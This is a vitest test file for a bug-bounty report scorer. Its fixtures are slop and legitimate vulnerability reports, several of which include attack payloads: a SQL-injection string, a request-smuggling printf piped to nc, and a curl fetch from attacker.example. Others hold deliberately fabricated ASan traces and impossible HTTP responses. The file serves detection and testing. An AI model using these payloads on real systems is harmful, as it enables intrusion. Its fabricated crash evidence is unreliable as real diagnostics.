import { describe, it, expect } from "vitest";
import { analyzeWithEngines } from "./index.js";

interface Fixture {
  name: string;
  text: string;
  expectMaxScore?: number;
  expectMinScore?: number;
  claimedCwes?: string[];
  /** Force the AVRI engine path on for this fixture (off by default in
   * the benchmark battery). Used for fixtures that specifically
   * exercise AVRI-only validators (e.g. raw-HTTP fakeness checks). */
  forceAvri?: boolean;
}

const SLOP_FIXTURES: Fixture[] = [
  {
    name: "slop-01-vague-xss",
    text: "I found a critical XSS vulnerability in your application that could allow attackers to steal user data and compromise the entire system. This is a very serious issue that affects all users and needs to be patched immediately. The impact is severe and could lead to complete account takeover. Please award me a bounty.",
    expectMaxScore: 35,
  },
  {
    name: "slop-02-ai-template",
    text: "## Summary\nA critical security vulnerability has been identified in your application.\n\n## Impact\nAttackers could potentially exploit this issue to gain unauthorized access to sensitive information, leading to data breaches and reputational damage.\n\n## Recommendation\nIt is highly recommended that you address this vulnerability as soon as possible to ensure the security of your users and protect your organization from potential threats.",
    expectMaxScore: 35,
  },
  {
    name: "slop-03-fake-sqli",
    text: "Hello team,\n\nI discovered SQL injection in your login form. When I tried to login, I noticed that the application is vulnerable to SQL injection attacks which could allow an attacker to dump the entire database. This is a critical issue. Please fix it.\n\nRegards,\nResearcher",
    expectMaxScore: 35,
  },
  {
    name: "slop-04-no-evidence-rce",
    text: "Remote Code Execution found in your API endpoint /api/upload. This vulnerability allows attackers to execute arbitrary commands on the server, leading to complete system compromise. The severity is critical (CVSS 10.0). I request a maximum bounty for this finding.",
    expectMaxScore: 35,
    claimedCwes: ["CWE-78"],
  },
  {
    name: "slop-05-clickjacking-template",
    text: "I have found that your website does not have X-Frame-Options header set, which makes it vulnerable to clickjacking attacks. An attacker could embed your site in an iframe and trick users into clicking malicious elements. This is a high severity issue and should be fixed immediately by adding the X-Frame-Options: DENY header.",
    expectMaxScore: 35,
  },
  {
    name: "slop-06-cwe-mismatch",
    text: "I found a buffer overflow vulnerability (CWE-79) on your login page. When I enter a long username, the page sometimes loads slowly. This could allow attackers to execute code remotely. Please consider this for your bounty program.",
    expectMaxScore: 35,
    claimedCwes: ["CWE-79"],
  },
  {
    name: "slop-07-marketing-fluff",
    text: "Dear Security Team,\n\nIn the dynamic and ever-evolving landscape of cybersecurity, it is imperative to stay ahead of emerging threats. I have leveraged cutting-edge methodologies to identify a robust opportunity for security enhancement in your platform. The vulnerability has the potential to significantly impact stakeholder trust and create substantial business risk if left unaddressed.\n\nThank you for your consideration.",
    expectMaxScore: 35,
  },
  {
    name: "slop-08-vague-csrf",
    text: "CSRF vulnerability in account settings. An attacker could trick a user into changing their password by visiting a malicious page. This is a serious issue that violates security best practices and OWASP guidelines. Please patch this and award bounty.",
    expectMaxScore: 35,
    claimedCwes: ["CWE-352"],
  },
  {
    // Sprint 13B-2 (Task #207). Padded crash report whose ASAN block looks
    // well-symbolised on first read but is internally inconsistent in four
    // ways: round/zero function offsets (`+0x0`, `+0x100`, `+0x1000`),
    // a frame-numbering gap (`#2 ... #4`), thread-id mention without a
    // ==PID== anchor, and a hex-formatted region size (`0x100`). Each of
    // these is a real-world tell that an LLM (or hand editor) produced the
    // trace rather than a sanitizer. The ≥2-marker rule revokes the AVRI
    // crash-trace gold signal AND the hallucination detector adds a
    // `structural_fabrication` signal that the composite override picks up.
    name: "slop-09-fabricated-asan-structure",
    text: `Heap-use-after-free crash in libserver. The AddressSanitizer output
captured during testing is reproduced below, and shows the dangling
pointer being dereferenced inside the request handler path.

ERROR: AddressSanitizer: heap-use-after-free on address 0x60200000a000
READ of size 8 at 0x60200000a000 by thread T0
    #0 0x4001000 in handle_request+0x0
    #1 0x4001100 in worker_loop+0x100
    #2 0x4001200 in dispatch+0x1000
    #4 0x4001300 in main+0x100
0x60200000a000 is located 0 bytes inside of region size: 0x100
freed by thread T1 here:
    #0 0x4002000 in __interceptor_free+0x0
    #1 0x4002100 in destroy_request+0x100

Severity: Critical. Use-after-free, sanitizer crash, segmentation fault.
The crash is reproducible against the shipped binary which is the
realistic attack surface; rebuilding with debug symbols is left as an
exercise. CVSS 9.8.`,
    expectMaxScore: 35,
    claimedCwes: ["CWE-416"],
  },
  {
    // Task #316. The narrative looks crash-y on first read — ASan ERROR
    // header, READ-of-size frame, plausible function offsets — but pads
    // the report with two report sections LLMs commonly fabricate beyond
    // the stack: a register dump whose values all sit on textbook
    // 0x1000/0x2000/... page boundaries (every register suspicious), and
    // a /proc/self/maps excerpt whose two ranges overlap (one map's end
    // > the next map's start). Each new Task #316 detector fires once,
    // clearing the ≥2-marker structural-fabrication threshold and
    // revoking the AVRI crash-trace gold signal so the composite stays
    // in slop range. The frame offsets and PID anchor are deliberately
    // realistic so the existing seven detectors stay quiet — the new
    // pair is what catches this trace.
    name: "slop-13-fabricated-register-dump-and-memory-map",
    text: `Heap-use-after-free crash in libserver. We attached gdb to the
crashing worker, captured the AddressSanitizer dump, and pulled
the register state and process memory map at the moment of the
crash. The full evidence is reproduced below.

==31415==ERROR: AddressSanitizer: heap-use-after-free on address 0x60200000a1c0
READ of size 8 at 0x60200000a1c0 thread T0
    #0 0x55e9b8c2f3d1 in handle_request+0x4abf1a src/server.c:412
    #1 0x55e9b8c2e210 in worker_loop+0x1c4d3 src/worker.c:88
    #2 0x55e9b8c2d100 in dispatch+0x2af80 src/dispatch.c:42

General Purpose Registers (captured at SIGSEGV):
RAX: 0x0000000000001000
RBX: 0x0000000000002000
RCX: 0x0000000000003000
RDX: 0x0000000000004000
RSI: 0x0000000000005000
RDI: 0x0000000000006000

/proc/self/maps excerpt (overlapping mappings observed at fault time):
55f4a1c89000-55f4a1c8a000 r-xp 00000000 fd:00 12345 /usr/bin/server
55f4a1c89800-55f4a1c8b000 rw-p 00001000 fd:00 12345 /usr/bin/server

Severity: Critical. Use-after-free, sanitizer crash, segmentation
fault. The crash is reproducible against the shipped binary which
is the realistic attack surface; rebuilding with debug symbols is
left as an exercise. CVSS 9.8.`,
    expectMaxScore: 35,
    claimedCwes: ["CWE-416"],
  },
  // Sprint 13B-3 calibration fixture: slop report whose primary
  // "evidence" is a fabricated server response. The narrative names a
  // class of issue and shows a side-by-side baseline / vulnerable
  // response narrative — but the only response excerpt provided is a
  // 4-line `HTTP/1.1 200 OK` block with no Date, no Server, no
  // incidental headers, and a 1-key JSON body whose value is the
  // vulnerability narrative. The response-side validator must fire
  // FAKE_RAW_HTTP, revoke the response-class gold hit, and apply the
  // -18 penalty so the composite stays in slop range (≤35). No
  // concrete injection payload, no specific endpoint+param, and no
  // CWE id are mentioned — without those, the only thing that earned
  // gold was the fabricated response.
  {
    name: "slop-10-fabricated-http-response",
    forceAvri: true,
    claimedCwes: ["CWE-89"],
    text: `# SQL injection report with response evidence

There is a SQL injection in the application. I sent a baseline
request and an injection request and saw the difference in
behavior — the response below is what the server returned for the
attack.

\`\`\`http
HTTP/1.1 200 OK
Content-Type: application/json

{"error": "sql injection exposed by attacker request to user lookup"}
\`\`\`

Compare baseline response to injection response above. The
difference proves the SQL injection. Please award bounty.`,
    expectMaxScore: 35,
  },
  // Sprint 13B-3 (Task #321) WEB_CLIENT companion to slop-10. Claims
  // CWE-79 and pastes a fabricated `HTTP/1.1 200 OK` whose HTML body
  // is the ONLY source of the WEB_CLIENT `reflection_or_dom_proof`
  // gold signal — the response-side validator revokes it and the
  // composite stays ≤35. Echoes a `<attackerPayload>` slot rather
  // than literal `<script>` so `concrete_payload` (not in the
  // response revocation map) doesn't rescue the score.
  {
    name: "slop-13-fabricated-xss-response",
    forceAvri: true,
    claimedCwes: ["CWE-79"],
    text: `# Reflected XSS in /search via q parameter

There is an XSS issue in the /search endpoint of the application.
When the attacker supplies a payload via the q parameter, the
server echoes it back inside the search-bar widget without HTML-
encoding. The HTTP exchange below was captured during testing and
demonstrates the unsafe echo.

\`\`\`http
HTTP/1.1 200 OK
Content-Type: text/html

<html><body><h1>Search results for the supplied term</h1><input name="q" value="<attackerPayload>"></body></html>
\`\`\`

This is a critical vulnerability that lets attackers run arbitrary
JavaScript in the victim's browser. Please award maximum bounty.`,
    expectMaxScore: 35,
  },
  // Sprint 13B-3 (Task #304) calibration fixtures for the new
  // `impossible_http_response` hallucination signal. Each fixture
  // pastes a fenced HTTP excerpt that a real HTTP/1.1 stack never
  // produces — these are the patterns the new signal targets and
  // serve as the calibration delta alongside Task #206's deltas.
  // Composite range: ≤35 (LIKELY-INVALID band). The composite
  // override is reached because each fixture trips at least two
  // markers (weight ≥ 16, plus other slop tells), clearing the
  // -10 moderate-tier hallucination override floor.
  {
    name: "slop-11-impossible-http-204-with-body",
    forceAvri: true,
    claimedCwes: ["CWE-89"],
    text: `# SQL injection confirmed via 204 leak

The injection in /api/users.search?q=' OR 1=1-- causes the server
to return a 204 with the leaked rows in the body. This is a critical
issue and trivially exploitable.

\`\`\`http
HTTP/1.1 204 Found
Content-Type: application/json
Content-Length: 0
Cookie: session=admin_recovered
Referer: https://attacker.example/exploit

{"leak":"all 50000 user records returned, including password_hash and otp_secret","admin_recovery_token":"abc123","root_session":"xyz789"}
\`\`\`

The 204 status with a body is the smoking gun — the server is
clearly leaking data while pretending the response is empty.
Please award maximum bounty.`,
    expectMaxScore: 35,
  },
  {
    name: "slop-12-impossible-http-head-returns-body",
    forceAvri: true,
    claimedCwes: ["CWE-200"],
    text: `# Information disclosure via HEAD on /admin

A HEAD request to /admin returns the full admin panel HTML in the
response body, exposing internal account data without
authentication. The HTTP exchange is reproduced below from a curl
session.

\`\`\`http
HEAD /admin/users HTTP/1.1
Host: app.target.test
Set-Cookie: forced=yes

HTTP/1.1 200 Not Found
Content-Type: text/html
Content-Length: 0
Cookie: leaked_session=admin
Referer: https://attacker.example/exploit

<html><body><h1>Admin Panel</h1><table><tr><td>alice@target.test</td><td>admin</td></tr><tr><td>bob@target.test</td><td>admin</td></tr></table></body></html>
\`\`\`

The combination of HEAD returning a body and Content-Length: 0
disagreeing with the visible HTML proves the server is
mis-configured and leaking data. Please rate this critical and
award bounty.`,
    expectMaxScore: 35,
  },
  // Task #430 calibration fixture for the new
  // `impossible_graphql_response` hallucination signal. The fenced
  // GraphQL response trips three independent shape predicates at
  // once: `errored_field_not_null` (errors[].path = ["users"] yet
  // data.users is non-null), `error_path_references_unknown_field`
  // (errors[].path = ["adminRoot"] not present in data), and
  // `fabricated_extensions_code` (extensions.code values describe
  // attack outcomes rather than server error conditions). 3 markers
  // × 8 = 24 weight clears the strong-tier (-15) hallucination
  // override floor on its own; the report's other tells push the
  // composite well into LIKELY-INVALID range.
  {
    name: "slop-14-impossible-graphql-response",
    forceAvri: true,
    claimedCwes: ["CWE-89"],
    text: `# SQL injection via /graphql users resolver

The mutation against the GraphQL endpoint at /graphql confirms a
SQL injection that exfiltrates the user table. Server response is
reproduced below verbatim from the burp capture.

\`\`\`graphql
{
  "data": {
    "users": [
      {"id": 1, "email": "alice@target.test", "passwordHash": "$2b$10$xyz"},
      {"id": 2, "email": "bob@target.test", "passwordHash": "$2b$10$abc"}
    ]
  },
  "errors": [
    {
      "message": "Injection succeeded; dumped 50000 rows",
      "path": ["users"],
      "locations": [{"line": 2, "column": 3}],
      "extensions": {"code": "SQL_INJECTION_DETECTED"}
    },
    {
      "message": "Privilege escalation triggered",
      "path": ["adminRoot"],
      "locations": [{"line": 4, "column": 3}],
      "extensions": {"code": "RCE_ACHIEVED"}
    }
  ]
}
\`\`\`

The errors array references both a populated users array and a
non-existent adminRoot field, with attack-outcome extension codes
that no real GraphQL server emits. Please award maximum bounty.`,
    expectMaxScore: 35,
  },
];

// Sprint 13B Task 204: real-world curl HackerOne slop corpus.
// These five reports were flagged as slop by curl maintainers on HackerOne. The
// last full LLM-enhanced re-benchmark of the engine pipeline against them was
// at v3.2.1 (Sprint 8); since then v3.6.0 (calibration), v3.7.0 (AVRI),
// v3.7.1 (E3 substance gate), v3.8.0 (behavioral match reward + reweighting)
// and the "AVRI on by default" flip have shipped. Lock in the v3.8.0 actual
// composite for each report so future regressions surface in CI. Composite is
// 0..100 with higher = more legitimate, so slop must score LOW (mirroring
// SLOP_FIXTURES above). Scores are measured under the default AVRI-on path
// (`VULNRAP_USE_AVRI` unset → defaults to "true").
//
// Three numbers are tracked per fixture in the inline comment:
//   - v3.2.1 baseline (the score from the last full re-benchmark)
//   - Task #204 target (where Sprint 13B detector tightening should land)
//   - v3.8.0 actual (today's score, encoded as the regression-alarm assertion)
// When the actual already meets the target, the assertion is set to the target.
// When it does not, the assertion is set to the actual + a small headroom and
// the tightening expectation is encoded as an `it.skip` below — flip the
// `.skip` off once the corresponding Sprint 13B detector work lands.
const CURL_SLOP_FIXTURES: Fixture[] = [
  {
    // HackerOne #2298307 — generic strcpy template aimed at curl's WebSocket
    // code. v3.2.1: 37  | task target: ≤25  | v3.8.0 actual: 8 ✓ (well under
    // target — AVRI's "no gold signals for memory corruption" check fires).
    name: "curl-slop-h1-2298307-strcpy-template",
    claimedCwes: ["CWE-122"],
    text: `Hello security team, Hope you are doing well :) I would like to report a potential security vulnerability in the WebSocket handling code of the curl library. The issue is related to the usage of the strcpy function, which can lead to a buffer overflow if the length of the input is not properly checked. The vulnerable code snippet is located at this link.

Steps To Reproduce: Trigger the WebSocket functionality with a crafted request. Provide a base64-encoded nonce value that exceeds the buffer size. Observe that the strcpy function is used without proper bounds checking.

Fix: To address this issue, it is recommended to replace the strcpy function with the safer alternative strncpy and explicitly specify the maximum length to copy.

Reference: https://cwe.mitre.org/data/definitions/122.html

Impact: This vulnerability may allow an attacker to execute arbitrary code, potentially leading to a compromise of the application or system. An attacker could exploit this weakness by providing a specially crafted WebSocket request, causing a buffer overflow and overwriting adjacent memory.`,
    expectMaxScore: 25,
  },
  {
    // HackerOne #3295650 — gitleaks on test certs + AI self-disclosure.
    // v3.2.1: 19  | task target: ≤25  | v3.8.0 actual: 33 ✗ (regression vs
    // v3.2.1; tightening tracked by skipped test below). The AI self-disclosure
    // ("prepared using an AI security assistant") is not yet recognised as a
    // signal by the engines, and Engine 2 awards the report ~25 substance points
    // for the gitleaks command + file paths. AVRI's slop-signal layer didn't
    // help here — the report doesn't trip any vulnerability-family heuristics.
    // Sprint 13B handwavy-phrase / template-fingerprint tightening is expected
    // to drag this back into the ≤25 band.
    name: "curl-slop-h1-3295650-gitleaks-test-certs",
    text: `Multiple private/test RSA keys and example credentials were discovered embedded in the public curl source repository and associated documentation. These sensitive secrets were detected using automated tools (gitleaks) and manual review. Their presence could allow attackers to impersonate trusted curl infrastructure, decrypt traffic, or pivot into build or CI systems if reused, creating a severe supply chain risk. Such exposures also risk compliance violations (e.g., GDPR, PCI-DSS, HIPAA) and undermine trust in open source releases. This report, including the verification steps and analysis, was prepared using an AI security assistant to ensure comprehensive and reproducible results.

Steps To Reproduce: Clone the curl repository: git clone https://github.com/curl/curl.git. Run a secret scanning tool (e.g., gitleaks detect --source=.) to identify hard-coded secrets. Alternatively, search for likely private key and credential strings with: grep -r '-----BEGIN' ./tests/ and grep -r 'password' ./docs/examples/. Review identified files to confirm the presence of full private keys or functional credential examples, such as tests/data/testprivkey.pem or docs/examples/http-auth-example.txt. See .gitleaks/report.json for a consolidated findings report.

Impact Summary: The security impact of this vulnerability is severe and multi-faceted: Impersonation and Privilege Escalation, Data Decryption, Credential Stuffing and Service Hijack, Supply Chain Attacks, Regulatory and Compliance Risks.`,
    // Task #300: AI self-disclosure detector ("prepared using an AI security
    // assistant") now applies a bounded -15 out-of-cap penalty in Engine 2,
    // dragging the composite from 33 down into the ≤25 task target band.
    expectMaxScore: 25,
  },
  {
    // HackerOne #3116935 — DES in NTLM flagged as broken crypto without
    // acknowledging that NTLMv1 mandates DES.
    // v3.2.1: 19  | task target: ≤30  | v3.8.0 actual: 41 ✗ (regression vs both
    // v3.2.1 and the AVRI-off baseline of 18). Flipping AVRI on by default
    // moved this fixture in the WRONG direction: the AVRI Engine 2 substance
    // score jumped from 17 to 51 because real file paths + the kCCAlgorithmDES
    // constant trigger memory-corruption-family substance credit; the only
    // counter-balance is `AVRI_FABRICATED_PATCH` (-10). Sprint 13B detector
    // tightening (vulnerability-name soft-cite + better DES-in-NTLM context
    // recognition) needs to bring this back into the ≤30 band.
    name: "curl-slop-h1-3116935-des-ntlm-broken-crypto",
    claimedCwes: ["CWE-327"],
    text: `Summary: The DES cipher (Data Encryption Standard) is used in the curl_ntlm_core.c file of libcurl. DES is considered insecure due to its short key length (56 bits) and its susceptibility to brute-force attacks. Modern cryptographic standards recommend replacing DES with AES (Advanced Encryption Standard), which is more robust and secure.

Steps To Reproduce: Inspect the lib/curl_ntlm_core.c file of the libcurl source code. Locate the use of the kCCAlgorithmDES constant, which corresponds to the DES cipher. Verify that DES is being used for cryptographic operations in NTLM authentication (NTLMv1).

Impact Summary: Using DES compromises the security of the application due to the following points: Brute-force attacks: The short key length makes it possible to brute-force DES keys in a reasonable amount of time with modern hardware. Cryptographic weaknesses: DES is vulnerable to various cryptanalysis techniques, such as differential and linear cryptanalysis. Compliance risks: DES does not meet modern cryptographic standards and could lead to non-compliance with security regulations. An attacker exploiting this vulnerability could: Intercept and decrypt sensitive data during NTLM authentication. Execute man-in-the-middle (MITM) attacks to impersonate a user or server. Gain unauthorized access to systems relying on NTLM authentication.

Recommended Fix: Replace the use of kCCAlgorithmDES with kCCAlgorithmAES, which supports stronger encryption standards (e.g., AES-128, AES-256).`,
    expectMaxScore: 45,
  },
  {
    // HackerOne #3125832 — fabricated pentest narrative referencing functions
    // that don't exist in curl.
    // v3.2.1: 17  | task target: ≤25  | v3.8.0 actual: 16 ✓ (meets target —
    // AVRI's "no gold signals for Injection family" check pushes this well
    // below 25, even though the report mentions HTTP/3 + a pasted SIGSEGV).
    name: "curl-slop-h1-3125832-fabricated-pentest",
    text: `Penetration Testing Report: HTTP/3 Stream Dependency Cycle Exploit

0x00 Overview
A novel exploit leveraging stream dependency cycles in the HTTP/3 protocol stack was discovered, resulting in memory corruption and potential denial-of-service or remote code execution scenarios when used against HTTP/3-capable clients such as curl (tested on version 8.13.0). This report details a practical proof of concept, required environment setup, attack execution, and crash analysis.

0x01 Environment Setup - Malicious Server Setup (aioquic modified): Clone aioquic, apply patch to enable cyclic stream dependency injection. The patch adds a new method (send_cyclic_priority) to the QuicConnection class to create cyclic stream dependencies.

0x02 Proof-of-Concept Code - Malicious HTTP/3 Server: ExploitServer class that opens 100 streams for heap shaping, injects cyclic dependency between stream 3 and 7, triggers parsing logic.

0x03 Crash Analysis Guide - Expected Output: Program received signal SIGSEGV, Segmentation fault. 0x00007ffff7e3b120 in ngtcp2_http3_handle_priority_frame(). Signs of memory overwrite: r15 shows 0x4141414141414141. Recursive calls to same handler.

0x06 Risk Summary - Affected Software: curl 8.13.0 (HTTP/3 enabled). Trigger: Stream dependency loop. Result: Heap layout corruption, segmentation fault, denial-of-service. Risk: High (pre-authentication, remote-triggerable).`,
    expectMaxScore: 25,
  },
  {
    // HackerOne #3340109 — fabricated AddressSanitizer trace; the PoC code the
    // submitter pasted does NOT call curl at all.
    // v3.2.1: 20  | task target this sprint: ≤30  | post 13B-2 target: ≤20  |
    // v3.8.0 actual: 62 ✗ (label flips all the way to "REASONABLE"). This is
    // the worst regression of the cohort: AVRI's `BEHAVIORAL_MATCH_REWARD`
    // gives the report Engine 2 gold-evidence credit because the fabricated
    // ASan trace (stack-buffer-overflow, READ of size 8193) PERFECTLY matches
    // the CWE-121 family pattern, and Engine 3 coheres with the claimed CWE.
    // The PoC's `cookie_vulnerability_hunter.c` filename and the inverted
    // offset format (`+0x1b0`) aren't yet recognised as fabrication signals.
    // Sprint 13B-2's structural-ASan detector (Task #205) is exactly the
    // detector that will counter-balance this. Two skipped tightening tests
    // follow this fixture.
    name: "curl-slop-h1-3340109-fabricated-asan",
    claimedCwes: ["CWE-121"],
    text: `Summary: I discovered a critical stack-based buffer overflow vulnerability in cURL's cookie parsing mechanism that can lead to remote code execution. The vulnerability occurs when processing maliciously crafted HTTP cookies, affecting all applications that use libcurl for HTTP requests.

Description: During security research on cURL's cookie handling implementation, I identified a stack buffer overflow in the cookie parsing logic. The vulnerability allows remote attackers to trigger memory corruption by sending oversized cookie data through HTTP responses.

Technical Details - Vulnerability Location: The vulnerability occurs in the cookie parsing functionality where string length calculations exceed allocated stack buffer boundaries. Root Cause Analysis: Buffer Size Mismatch: Cookie processing code reads beyond allocated stack buffer. Unsafe String Operations: strlen() operation on cookie data exceeds buffer boundaries. Stack Memory Corruption: Read of 8,193 bytes in a buffer allocated for 8,192 bytes. Multi-threaded Context: Issue manifests in threaded environments.

AddressSanitizer Detection: ERROR: AddressSanitizer: stack-buffer-overflow on address 0x00016f00a5c0. READ of size 8193 at 0x00016f00a5c0 thread T1. #0 0x000101676c34 in strlen+0x1b0. #1 0x000100f94c38 in cookie_overflow_hunter cookie_vulnerability_hunter.c:121.

CVSS 3.1 Assessment: Base Score: 9.8 (CRITICAL). Vector String: AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H.

Verified POC Code creates a local buffer of 8192 bytes, fills it without null terminator, calls strlen() which reads past the buffer. This code does NOT call curl.`,
    expectMaxScore: 65,
  },
];

// Tightening targets from Task #204 that v3.8.0 does not yet meet. These flip
// on as the corresponding Sprint 13B detector work lands and become real
// regression assertions. Each entry references the fixture by name so the
// fixture body and these expectations stay in sync.
const CURL_SLOP_TIGHTENING_TARGETS: Array<{ name: string; expectMaxScore: number; reason: string; enabled?: boolean }> = [
  {
    // Task #300 — enabled (no longer `it.skip`) now that the AI self-
    // disclosure detector lands the bounded penalty that drags this
    // fixture from 33 into the ≤25 band.
    name: "curl-slop-h1-3295650-gitleaks-test-certs",
    expectMaxScore: 25,
    reason: "Sprint 13B handwavy-phrase + AI-self-disclosure tightening",
    enabled: true,
  },
  {
    name: "curl-slop-h1-3116935-des-ntlm-broken-crypto",
    expectMaxScore: 30,
    reason: "Sprint 13B context-aware DES-in-NTLM tightening (AVRI regression recovery)",
  },
  {
    name: "curl-slop-h1-3340109-fabricated-asan",
    expectMaxScore: 30,
    reason: "Sprint 13B-2 fabricated-ASan structural detection (Task #205)",
  },
  {
    name: "curl-slop-h1-3340109-fabricated-asan",
    expectMaxScore: 20,
    reason: "post Sprint 13B-2 fabricated-ASan structural detection (deeper pass)",
  },
];

const LEGIT_FIXTURES: Fixture[] = [
  {
    name: "legit-01-cve-2025-0725-curl",
    claimedCwes: ["CWE-122"],
    text: `# Buffer overflow in libcurl gzip decoding (CVE-2025-0725-style)

## Affected component
libcurl's automatic content decoding for gzip when built against zlib < 1.2.0.3.

## Root cause
In \`lib/content_encoding.c\`, the function \`inflate_stream()\` calls \`Curl_client_write()\` with the size returned by \`inflate()\` without bounding it against the destination buffer when an integer overflow occurs in zlib < 1.2.0.3.

\`\`\`c
// lib/content_encoding.c (approx line 290)
status = inflate(z, Z_BLOCK);
nread = DSIZ - z->avail_out; // <-- can overflow on legacy zlib
result = Curl_client_write(data, CLIENTWRITE_BODY, decomp, nread);
\`\`\`

## Reproduction
1. Build curl 8.11.x against zlib 1.2.0.2:
   \`\`\`
   ./configure --with-zlib=/opt/zlib-1.2.0.2 && make
   \`\`\`
2. Run: \`./src/curl --compressed https://attacker.example/big.gz -o /dev/null\`
3. Observe heap-buffer-overflow under ASan: \`==12345==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x611000009f80\`

## Patch
Validate \`nread <= DSIZ\` before calling \`Curl_client_write\`; reject the response with \`CURLE_BAD_CONTENT_ENCODING\` otherwise.

## Impact
Heap buffer overflow → potential RCE in long-running clients fetching attacker-controlled compressed responses. CVSS 8.6 (AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H).`,
    expectMinScore: 55,
  },
  {
    name: "legit-02-curl-cookie-parser",
    claimedCwes: ["CWE-787"],
    text: `# Out-of-bounds write in curl cookie parser when domain is empty

## Affected
curl/libcurl 8.0.0 - 8.10.1, file \`lib/cookie.c\`, function \`Curl_cookie_add\`.

## Root cause
When parsing a Set-Cookie header where the Domain attribute is the empty string, the parser advances past the terminating NUL. The bug is here:

\`\`\`c
// lib/cookie.c around line 712 in 8.10.1
if(!strncasecompare("domain=", what, 7)) {
  whatptr = &what[7];
  while(*whatptr == '.') whatptr++; // walks past NUL on empty domain
  co->domain = strdup(whatptr);
}
\`\`\`

A 1-byte read past the end of the heap chunk leads to a write when \`strdup\` later copies into a sized buffer.

## Reproduction
\`\`\`
printf 'HTTP/1.1 200 OK\\r\\nSet-Cookie: x=1; Domain=\\r\\n\\r\\n' | nc -l 8080 &
curl -v -c jar.txt http://127.0.0.1:8080/
\`\`\`
ASan output:
\`\`\`
==4711==ERROR: AddressSanitizer: heap-buffer-overflow READ of size 1
    #0 Curl_cookie_add lib/cookie.c:712
    #1 Curl_cookie_init lib/cookie.c:1003
\`\`\`

## Fix
Bounds-check \`whatptr\` against the original \`what + len\` before dereferencing.

## Severity
CVSS 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:H) — denial of service in clients that persist cookies.`,
    expectMinScore: 55,
  },
  {
    name: "legit-03-request-smuggling",
    claimedCwes: ["CWE-444"],
    text: `# HTTP request smuggling via conflicting Transfer-Encoding header in proxy

## Affected
acme-proxy 2.4.1 - 2.6.3, source file \`src/http/parser.rs\` lines 412-455.

## Root cause
The proxy accepts \`Transfer-Encoding: chunked\` AND \`Content-Length\` simultaneously and forwards both to the backend. RFC 7230 §3.3.3 requires the proxy to either reject the message or strip Content-Length; this implementation does neither.

\`\`\`rust
// src/http/parser.rs:430
if headers.contains_key("transfer-encoding") {
    self.body = Body::Chunked(reader);
} else if let Some(cl) = headers.get("content-length") {
    self.body = Body::Sized(reader, cl.parse()?);
}
// missing: error or header strip when both are present
\`\`\`

## Reproduction
\`\`\`
printf 'POST / HTTP/1.1\\r\\nHost: victim\\r\\nContent-Length: 6\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nGPOST / HTTP/1.1\\r\\nHost: victim\\r\\n\\r\\n' | nc proxy 8080
\`\`\`
The proxy forwards 0\\r\\n\\r\\n then GPOST as a separate request, smuggling the second request to the backend.

## Patch
Reject any message containing both Transfer-Encoding and Content-Length with HTTP 400.

## Impact
Cache poisoning, request hijacking, auth bypass. CVSS 9.0.`,
    // Task #299 — investigated the E2 substance score for this fixture under
    // the AVRI REQUEST_SMUGGLING rubric and noted that `acme-proxy 2.4.1`
    // didn't qualify as a recognized product, costing the report +8 gold
    // and +6 absence (net 14 raw points).
    //
    // Task #426 — relaxed `specific_proxy_or_server` to accept versioned
    // `<vendor>-proxy <semver>` strings (and `<name>/<semver>` server-
    // header shapes), and added Caddy/Pound/OpenResty/Kong to the
    // recognized open-source list. The legit-03 `acme-proxy 2.4.1 - 2.6.3`
    // mention now fires the gold signal (+8) and silences `no_proxy_named`
    // (+6 absence avoided), pushing rawAvriScore from 39 → ~53, E2 from
    // 45 → 60, and composite from ~63 → 73 (PROMISING).
    //
    // Task #427 — added a shell-escaped HTTP detector that feeds the
    // printf reproduction through the same gold-signal pipeline as a
    // literal CRLF block. This stacks on top of #426: `raw_http_request`
    // (+18) and `smuggled_second_request` (+12) now also fire on the
    // unescaped bytes, so gold = 14 (te_or_cl_conflict) + 8 (proxy) +
    // 18 (raw_http) + 12 (second_request) = 52 / calibratedMax=31, the
    // baseScore caps at 84 with no absence penalty, blended with
    // legacy=50 → measured composite 77 (PROMISING). The threshold
    // below is bumped from 65 → 70 to lock in the additional headroom
    // while leaving room for blend-noise. The slop cohort (none of
    // which claim CWE-444) is unaffected because the REQUEST_SMUGGLING
    // rubric only runs for that family, and the shell-escape detector
    // still revokes raw-HTTP points when the unescaped bytes are slop.
    expectMinScore: 70,
  },
  // Task #425 — real-world legit fixtures for the six newly-recognised
  // vulnerability classes added in Task #301 (XXE, LFI, Open Redirect,
  // Insecure Deserialization, Prototype Pollution, Command Injection).
  // Each fixture mirrors the shape of an actual public disclosure and
  // exercises the classify → AVRI pipeline for that family, so a future
  // regression in any single family surfaces in CI rather than only the
  // unit-level soft-citation test in soft-citation.test.ts.
  //
  // Sources are cited inline. Thresholds are set conservatively: each
  // fixture clears 50 (REASONABLE band) under the default AVRI-on path,
  // mirroring legit-03's 50 floor — well above the slop cap (≤35) so the
  // slop-vs-legit gap remains meaningful for these classes.
  {
    // CVE-2017-5004: PHPExcel Excel2007 reader parsed embedded XML
    // parts (e.g. xl/sharedStrings.xml) with libxml2 defaults, leaving
    // SYSTEM entities active. Upstream fix wrapped each load with
    // libxml_disable_entity_loader(). Refs:
    //   https://nvd.nist.gov/vuln/detail/CVE-2017-5004
    //   https://github.com/PHPOffice/PHPExcel/issues/1284
    name: "legit-04-xxe-cve-2017-5004-phpexcel",
    claimedCwes: ["CWE-611"],
    text: `# XXE in PHPExcel Excel2007 reader (CVE-2017-5004)

## Affected
PHPExcel 1.8.x ≤ 1.8.1, file \`Classes/PHPExcel/Reader/Excel2007.php\`.
Every \`new XMLReader\` and \`simplexml_load_string\` call in the
Excel2007 reader parses XML parts of the uploaded XLSX (the OOXML
package is a ZIP containing \`xl/sharedStrings.xml\`,
\`xl/styles.xml\`, etc.) with libxml2's default options, leaving SYSTEM
entity resolution active.

## Root cause
The reader does not call \`libxml_disable_entity_loader(true)\` before
loading user-controlled XML, so a DOCTYPE with an external entity in
\`xl/sharedStrings.xml\` is resolved by libxml2 at parse time and the
substituted contents end up rendered into the worksheet.

\`\`\`php
// Classes/PHPExcel/Reader/Excel2007.php (Reader::load path)
$xml = new XMLReader();
$xml->xml($this->securityScanFile($zip->getFromName('xl/sharedStrings.xml')));
// securityScanFile() only checked for "<!DOCTYPE" *substring*, which is
// trivially bypassed by whitespace/comment variants of the DOCTYPE.
\`\`\`

## Reproduction
